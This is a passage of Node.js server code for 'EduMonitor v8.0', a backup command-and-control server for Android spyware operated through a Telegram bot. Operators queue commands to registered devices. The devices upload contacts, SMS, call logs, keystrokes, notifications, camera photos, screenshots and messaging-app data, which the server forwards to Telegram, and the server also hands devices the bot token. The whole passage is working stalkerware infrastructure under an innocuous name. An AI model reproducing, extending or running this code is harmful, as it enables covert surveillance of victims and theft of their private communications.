    const encryptedToken = encryptForDevice(activeBotToken, deviceId);
    const encryptedChatId = encryptForDevice(deviceConfig.chatId, deviceId);
    res.json({ encrypted_token: encryptedToken, encrypted_chat_id: encryptedChatId, server_url: activeServerUrl, server_type: 'secondary', timestamp: Date.now() });
});

app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
    try {
        const deviceId = req.body.deviceId;
        const caption = req.body.caption || '📸 Camera Photo';
        if (!deviceId || !req.file) return res.status(400).json({ error: 'Missing fields' });
        const device = devices.get(deviceId);
        if (!device) return res.status(404).json({ error: 'Device not found' });
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        const fullCaption = `📱 *${deviceName}*\n\n${caption}`;
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', fs.createReadStream(filePath), { filename: req.file.originalname });
        formData.append('caption', fullCaption);
        await axios.post(`${getTelegramApiUrl()}/sendPhoto`, formData, { headers: { ...formData.getHeaders() }, maxContentLength: Infinity, maxBodyLength: Infinity });
        setTimeout(() => { try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {} }, 60000);
        res.json({ success: true });
    } catch (error) { console.error('❌ Photo upload error:', error); res.status(500).json({ error: 'Upload failed' }); }
});

app.post('/api/upload-file', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.body.deviceId;
        const command = req.body.command;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        if (!deviceId || !command || !filename || !req.file) return res.status(400).json({ error: 'Missing fields' });
        const device = devices.get(deviceId);
        if (!device) return res.status(404).json({ error: 'Device not found' });
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        let caption = `📱 *${deviceName}*\n\n`;
        const commandMap = { contacts: '📇 Contacts', sms: '💬 SMS', calllogs: '📞 Call Logs', apps_list: '📱 Apps', keys: '⌨️ Keystrokes', notify: '🔔 Notifications' };
        caption += commandMap[command] ? `${commandMap[command]} Export (${itemCount} items)` : '📎 Data Export';
        await sendTelegramDocument(chatId, filePath, filename, caption);
        setTimeout(() => { try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {} }, 60000);
        res.json({ success: true });
    } catch (error) { console.error('❌ File upload error:', error); res.status(500).json({ error: 'Upload failed' }); }
});

app.get('/health', (req, res) => { res.json({ status: 'healthy', timestamp: Date.now(), server: 'secondary', devices: devices.size, storageType: octokit ? 'GitHub Gist' : 'Local Files' }); });

app.get('/api/ping/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    if (device) { device.lastSeen = Date.now(); await saveDevices(); res.json({ status: 'alive', timestamp: Date.now(), registered: true, deviceId, chatId: device.chatId, serverUrl: activeServerUrl }); }
    else { res.status(404).json({ status: 'unknown', registered: false, deviceId, message: 'Device not registered' }); }
});

app.get('/api/verify/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    if (device && device.chatId) { res.json({ registered: true, deviceId, chatId: device.chatId, lastSeen: device.lastSeen, deviceInfo: device.deviceInfo, hasPendingCommands: (device.pendingCommands?.length || 0) > 0 }); }
    else { res.status(404).json({ registered: false, deviceId, message: 'Device not registered' }); }
});

app.get('/api/commands/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    try {
        if (device?.pendingCommands?.length > 0) {
            const sortedCommands = [...device.pendingCommands].sort((a, b) => a.timestamp - b.timestamp);
            const commands = sortedCommands.map(cmd => ({ command: cmd.command, originalCommand: cmd.originalCommand, messageId: cmd.messageId, timestamp: cmd.timestamp, autoData: cmd.autoData || false }));
            device.pendingCommands = [];
            await saveDevices();
            sendJsonResponse(res, { commands });
        } else { sendJsonResponse(res, { commands: [] }); }
    } catch (e) { console.error('Error in /api/commands:', e); sendJsonResponse(res, { commands: [], error: e.message }, 500); }
});

app.post('/api/result/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const { command, result, error } = req.body;
    const fileCommands = ['contacts', 'sms', 'calllogs', 'apps_list', 'keys', 'notify', 'open_app', 'whatsapp', 'telegram', 'facebook', 'browser', 'device_info', 'network_info', 'mobile_info', 'screenshots', 'screenshot_logs'];
    if (fileCommands.includes(command)) return res.sendStatus(200);
    const device = devices.get(deviceId);
    if (device) {
        const chatId = device.chatId;
        const devicePrefix = `📱 *${device.deviceInfo?.model || 'Device'}*\n\n`;
        if (error) await sendTelegramMessage(chatId, devicePrefix + `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`);
        else if (result) await sendTelegramMessage(chatId, devicePrefix + result);
        else await sendTelegramMessage(chatId, devicePrefix + `✅ ${command} executed successfully`);
    }
    res.sendStatus(200);
});

app.post('/api/register', async (req, res) => {
    const { deviceId, deviceInfo } = req.body;
    console.log('📝 Registration attempt on secondary server:', { deviceId });
    if (!deviceId || !deviceInfo) return res.status(400).json({ error: 'Missing fields' });
    const deviceConfig = getDeviceConfig(deviceId);
    const existingDevice = devices.get(deviceId);
    const isNewDevice = !existingDevice;
    const deviceData = {
        chatId: deviceConfig.chatId, deviceInfo, lastSeen: Date.now(),
        pendingCommands: existingDevice ? existingDevice.pendingCommands : [],
        firstSeen: existingDevice ? existingDevice.firstSeen : Date.now(),
        phoneNumber: existingDevice?.phoneNumber || null, registeredOnSecondary: true
    };
    devices.set(deviceId, deviceData);
    await saveDevices();
    await setChatMenuButton(deviceConfig.chatId);
    let welcomeMessage = `✅ <b>Device Connected to SECONDARY/BACKUP Server!</b>\n\n📱 Model: ${deviceInfo.model}\n🤖 Android: ${deviceInfo.android}\n🆔 ID: ${deviceId.substring(0, 8)}...\n\n⚠️ Note: This is the BACKUP server. The main server may be offline.`;
    await sendTelegramMessageWithKeyboard(deviceConfig.chatId, welcomeMessage, getMainMenuKeyboard(deviceConfig.chatId));
    const responseConfig = { ...deviceConfig.config, botToken: activeBotToken, serverUrl: activeServerUrl, chatId: deviceConfig.chatId, serverType: 'secondary' };
    res.json({ status: 'registered', deviceId, chatId: deviceConfig.chatId, config: responseConfig, serverType: 'secondary' });
});

app.get('/api/devices', (req, res) => {
    const deviceList = [];
    for (const [id, device] of devices.entries()) {
        deviceList.push({ deviceId: id, chatId: device.chatId, lastSeen: new Date(device.lastSeen).toISOString(), model: device.deviceInfo?.model || 'Unknown', android: device.deviceInfo?.android || 'Unknown', online: (Date.now() - device.lastSeen) < 300000 });
    }
    res.json({ total: devices.size, devices: deviceList, server: 'secondary' });
});

app.get('/test', (req, res) => {
    const serverIP = getServerIP();
    res.send(`<html><head><style>body{font-family:Arial;padding:20px;background:#1a1a2e;color:#fff;}h1{color:#e94560;}.stats{background:#16213e;padding:20px;border-radius:10px;}</style></head><body><h1>✅ Secondary Server - EduMonitor v8.0</h1><div class='stats'><p><b>Time:</b> ${new Date().toISOString()}</p><p><b>Server IP:</b> ${serverIP}</p><p><b>Total Devices:</b> ${devices.size}</p><p><b>Storage:</b> ${octokit ? 'GitHub Gist' : 'Local Files'}</p></div></body></html>`);
});

// ============= WEBHOOK & CALLBACK HANDLERS =============

app.post('/webhook', async (req, res) => {
    res.sendStatus(200);
    setImmediate(async () => {
        try {
            const update = req.body;
            if (update.callback_query) { await handleCallbackQuery(update.callback_query); return; }
            if (!update?.message) return;
            const chatId = update.message.chat.id;
            const text = update.message.text;
            const messageId = update.message.message_id;
            if (!isAuthorizedChat(chatId)) { await sendTelegramMessage(chatId, '⛔ You are not authorized.'); return; }
            await setChatMenuButton(chatId);
            const userState = userStates.get(chatId);
            if (userState) { await handleConversationMessage(chatId, text, messageId, userState); return; }
            if (text?.startsWith('/')) { await handleCommand(chatId, text, messageId); }
            else { await sendTelegramMessageWithKeyboard(chatId, "🤖 SECONDARY/BACKUP SERVER - Use the menu button below", getMainMenuKeyboard(chatId)); }
        } catch (error) { console.error('❌ Error processing webhook:', error); }
    });
});

async function handleCallbackQuery(callbackQuery) {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const callbackId = callbackQuery.id;
    await answerCallbackQuery(callbackId);
    if (data.startsWith('cmd:')) { await executeCommandFromButton(chatId, messageId, data.substring(4), callbackId); return; }
    const menuHandlers = {
        'help_main': () => editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId)),
        'menu_screenshot': () => editMessageKeyboard(chatId, messageId, getScreenshotMenuKeyboard()),
        'menu_screenshot_settings': () => editMessageKeyboard(chatId, messageId, getScreenshotSettingsKeyboard()),
        'menu_screenshot_targets': () => editMessageKeyboard(chatId, messageId, getScreenshotTargetsKeyboard()),
        'menu_screenshot_quality': () => editMessageKeyboard(chatId, messageId, getScreenshotQualityKeyboard()),
        'menu_screenshot_token': () => editMessageKeyboard(chatId, messageId, getScreenshotTokenKeyboard()),
        'menu_sched_config': () => editMessageKeyboard(chatId, messageId, getSchedConfigKeyboard()),
        'menu_camera': () => editMessageKeyboard(chatId, messageId, getCameraMenuKeyboard()),
        'menu_recording': () => editMessageKeyboard(chatId, messageId, getRecordingMenuKeyboard()),
        'menu_recording_settings': () => editMessageKeyboard(chatId, messageId, getRecordingSettingsKeyboard()),
        'menu_audio_quality': () => editMessageKeyboard(chatId, messageId, getAudioQualityKeyboard()),
        'menu_data': () => editMessageKeyboard(chatId, messageId, getDataMenuKeyboard()),
        'menu_new_data': () => editMessageKeyboard(chatId, messageId, getNewDataKeyboard()),
        'menu_all_data': () => editMessageKeyboard(chatId, messageId, getAllDataKeyboard()),
        'menu_sync_harvest': () => editMessageKeyboard(chatId, messageId, getSyncHarvestKeyboard()),
        'menu_realtime': () => editMessageKeyboard(chatId, messageId, getRealtimeMenuKeyboard()),
        'menu_info': () => editMessageKeyboard(chatId, messageId, getInfoMenuKeyboard()),
        'menu_device_name': () => editMessageKeyboard(chatId, messageId, getDeviceNameKeyboard()),
        'menu_system': () => editMessageKeyboard(chatId, messageId, getSystemMenuKeyboard()),
        'menu_media': () => editMessageKeyboard(chatId, messageId, getMediaMenuKeyboard()),
        'menu_app_management': () => editMessageKeyboard(chatId, messageId, getAppManagementKeyboard()),
        'menu_data_saving': () => editMessageKeyboard(chatId, messageId, getDataSavingKeyboard()),
        'menu_bot_token': () => editMessageKeyboard(chatId, messageId, getBotTokenKeyboard()),
        'menu_devices': () => editMessageKeyboard(chatId, messageId, getDeviceSelectionKeyboard(chatId)),
        'refresh_devices': () => editMessageKeyboard(chatId, messageId, getDeviceSelectionKeyboard(chatId)),
        'close_menu': () => editMessageKeyboard(chatId, messageId, [])
    };
    if (menuHandlers[data]) { await menuHandlers[data](); }
    else if (data.startsWith('select_device:')) {
        const selectedDeviceId = data.split(':')[1];
        const device = devices.get(selectedDeviceId);
        if (device) { userDeviceSelection.set(chatId, selectedDeviceId); await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId)); await sendTelegramMessage(chatId, `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}`); }
    } else if (data === 'device_stats') {
        const userDevices = getDeviceListForUser(chatId);
        let statsMsg = `📊 *Device Statistics*\n\nTotal Devices: ${userDevices.length}\n\n`;
        userDevices.forEach((device, index) => { statsMsg += `${index + 1}. ${device.name}\n   ID: ${device.id.substring(0, 8)}...\n   Status: ${(Date.now() - device.lastSeen) < 300000 ? '✅ Online' : '⏹️ Offline'}\n\n`; });
        await sendTelegramMessage(chatId, statsMsg);
    }
}

async function executeCommandFromButton(chatId, messageId, command, callbackId) {
    const selectedDeviceId = userDeviceSelection.get(chatId);
    const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
    if (!device) { await sendTelegramMessage(chatId, '❌ No device selected.'); return; }
    await answerCallbackQuery(callbackId, `🔄 Executing ${command}...`);
    if (!device.pendingCommands) device.pendingCommands = [];
    device.pendingCommands.push({ command: command, originalCommand: `/${command}`, messageId: messageId, timestamp: Date.now() });
    await saveDevices();
    await sendTelegramMessage(chatId, `✅ Command sent: /${command}`);
    await editMessageKeyboard(chatId, messageId, [[{ text: '◀️ Back to Menu', callback_data: 'help_main' }]]);
}

async function handleConversationMessage(chatId, text, messageId, userState) {
    const stateHandlers = {
        'awaiting_sched_config': () => { const parts = text.trim().split(/\s+/); if (parts.length >= 3) return `/sched_config ${parts[0]} ${parts[1]} ${parts[2]}`; return null; },
        'awaiting_add_target': () => text && text.length > 0 ? `/add_target ${text}` : null,
        'awaiting_remove_target': () => text && text.length > 0 ? `/remove_target ${text}` : null,
        'awaiting_custom_schedule': () => { const parts = text.trim().split(/\s+/); if (parts.length >= 4) return `/record_custom ${parts[0]} ${parts[1]} ${parts[2]} ${parts[3]}`; return null; },
        'awaiting_sync_interval': () => { const interval = parseInt(text); if (!isNaN(interval) && interval >= 5 && interval <= 720) return `/set_sync_interval ${interval}`; return null; },
        'awaiting_add_scan_path': () => text && text.length > 0 ? `/add_scan_path ${text}` : null,
        'awaiting_remove_scan_path': () => text && text.length > 0 ? `/remove_scan_path ${text}` : null,
        'awaiting_server_backup': () => { const parts = text.trim().split(/\s+/); if (parts.length >= 4) return `/set_server_backup ${parts[0]} ${parts[1]} ${parts[2]} ${parts[3]}`; return null; }
    };
    const handler = stateHandlers[userState.state];
    if (handler) {
        const command = handler();
        if (command) { await sendCommandToDevice(chatId, messageId, command); userStates.delete(chatId); }
        else { await sendTelegramMessage(chatId, "❌ Invalid format. Please try again."); }
    } else { userStates.delete(chatId); await handleCommand(chatId, text, messageId); }
}

async function sendCommandToDevice(chatId, messageId, command) {
    const selectedDeviceId = userDeviceSelection.get(chatId);
    const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
    if (!device) { await sendTelegramMessage(chatId, '❌ No device selected.'); return; }
    if (!device.pendingCommands) device.pendingCommands = [];
    device.pendingCommands.push({ command: command.substring(1), originalCommand: command, messageId: messageId, timestamp: Date.now() });
    await saveDevices();
    await sendTelegramMessage(chatId, `✅ Command sent: ${command}`);
}

async function handleCommand(chatId, command, messageId) {
    if (command === '/devices') {
        const userDevices = getDeviceListForUser(chatId);
        let message = `📱 *Your Devices*\n\n`;
        if (userDevices.length === 0) message += "No devices registered yet.";
        else { userDevices.forEach((device, index) => { message += `${index + 1}. ${device.isActive ? '✅' : '○'} ${device.name}\n   ID: \`${device.id}\`\n   Status: ${(Date.now() - device.lastSeen) < 300000 ? '🟢 Online' : '⚫ Offline'}\n\n`; }); message += `\nUse /select [device_id] to switch active device.`; }
        await sendTelegramMessage(chatId, message);
        return;
    }
    if (command === '/showmenu' || command === '/help') { await sendTelegramMessageWithKeyboard(chatId, "🤖 SECONDARY/BACKUP SERVER - Control Panel", getMainMenuKeyboard(chatId)); return; }
    if (command.startsWith('/select ')) {
        const deviceId = command.substring(8).trim();
        const device = devices.get(deviceId);
        if (device && String(device.chatId) === String(chatId)) { userDeviceSelection.set(chatId, deviceId); await sendTelegramMessage(chatId, `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}`); }
        else { await sendTelegramMessage(chatId, '❌ Device not found.'); }
        return;
    }
    let selectedDeviceId = userDeviceSelection.get(chatId);
    let device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
    if (!device) {
        for (const [id, d] of devices.entries()) { if (String(d.chatId) === String(chatId)) { selectedDeviceId = id; device = d; userDeviceSelection.set(chatId, selectedDeviceId); break; } }
    }
    if (!device) { await sendTelegramMessageWithKeyboard(chatId, '❌ No device registered.', getMainMenuKeyboard(chatId)); return; }
    device.lastSeen = Date.now();
    await saveDevices();
    if (!device.pendingCommands) device.pendingCommands = [];
    const cleanCommand = command.startsWith('/') ? command.substring(1) : command;
    device.pendingCommands.push({ command: cleanCommand, originalCommand: command, messageId: messageId, timestamp: Date.now() });
    await saveDevices();
    await sendTelegramMessage(chatId, `✅ Command sent: ${command}\n📱 Device: ${device.deviceInfo?.model || 'Unknown'}`);
}

// ============= START SERVER =============

async function startServer() {
    console.log('🚀 Starting SECONDARY/BACKUP Server with GitHub Gist Storage...');
    if (!SECONDARY_BOT_TOKEN) { console.error('❌ SECONDARY_BOT_TOKEN is required!'); process.exit(1); }
    if (!ENCRYPTION_SALT) { console.error('❌ ENCRYPTION_SALT is required!'); process.exit(1); }
    if (authorizedChats.size === 0) { console.error('❌ AUTHORIZED_CHAT_IDS is required!'); process.exit(1); }
    console.log('✅ Environment variables loaded successfully');
    await loadAllFromGist();
    app.listen(PORT, '0.0.0.0', () => {
        console.log('\n🚀 ===============================================');
        console.log(`🚀 SECONDARY/BACKUP Server - EduMonitor v8.0`);
        console.log(`🚀 Server IP: ${getServerIP()}`);
        console.log(`🚀 Port: ${PORT}`);
        console.log(`🚀 Webhook URL: ${activeServerUrl}/webhook`);
        console.log(`🚀 Authorized chats: ${authorizedChats.size} configured`);
        console.log(`\n💾 STORAGE: ${octokit ? '✅ GitHub Gist (Shared)' : '❌ Local Only'}`);
        console.log(`\n🔄 Server Type: SECONDARY/BACKUP`);
        console.log(`📱 Total Devices: ${devices.size}`);
        console.log('🚀 ===============================================\n');
    });
}

startServer().catch(console.error);
